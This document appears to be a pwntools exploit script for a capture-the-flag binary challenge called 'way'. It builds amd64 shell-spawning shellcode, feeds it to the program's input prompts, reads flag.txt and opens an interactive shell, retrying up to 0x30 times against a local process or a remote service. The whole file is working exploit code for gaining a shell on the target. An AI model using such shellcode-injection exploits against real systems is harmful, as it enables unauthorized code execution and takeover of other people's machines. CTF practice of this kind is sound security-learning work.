from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./way"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("", 9999)


def ddebug(io, b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


shellcode = asm(shellcraft.amd64.linux.sh())


def pwn(io):
    ddebug(io, "break *0x04012EB\n continue")
    payload = b""
    log.success(len(shellcode))
    io.sendlineafter("your home:\n", "16")

    payload = b"a" * 0 + shellcode
    io.sendlineafter("find mother:\n", payload)

    io.sendlineafter("you find:\n", "119")

    io.sendline(b"cat flag.txt")
    data = io.recv(100, timeout=1)
    if b"{" in data:
        log.success(data)
        sleep(100)

    io.interactive()


def getio():
    io = process([vuln_path]) if not f_remote else remote("", 9999)
    return io


for i in range(0x30):
    log.success(f"-----------{i}--------------")
    io = None
    try:
        io = getio()
        pwn(io)
    except Exception as e:
        pass
    finally:
        if io:
            io.close()
